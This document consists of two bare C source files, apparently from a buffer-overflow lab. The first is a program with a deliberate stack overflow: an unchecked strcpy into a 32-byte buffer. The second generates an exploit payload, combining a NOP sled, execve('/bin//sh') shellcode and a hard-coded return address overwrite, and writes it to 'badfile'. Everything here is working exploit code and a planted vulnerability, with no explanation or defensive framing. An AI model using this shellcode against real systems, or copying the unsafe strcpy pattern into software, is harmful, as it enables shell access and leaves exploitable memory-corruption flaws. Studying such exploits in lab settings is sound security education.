#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vuln_function(char *input) {
    char buffer[32];
    strcpy(buffer, input);
    printf("Received input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vuln_function(argv[1]);
    printf("Execution finished.\n");
    return 0;
}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE 100
#define RET_ADDRESS 0xffffd5f0

char shellcode[] =
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80";

int main() {
    char buffer[BUFFER_SIZE];
    FILE *badfile;

    memset(buffer, 0x90, BUFFER_SIZE);
    memcpy(buffer + (BUFFER_SIZE - sizeof(shellcode) - 1), shellcode, sizeof(shellcode));
    *((long *)(buffer + 76)) = RET_ADDRESS;

    badfile = fopen("badfile", "wb");
    fwrite(buffer, 1, BUFFER_SIZE, badfile);
    fclose(badfile);

    return 0;
}
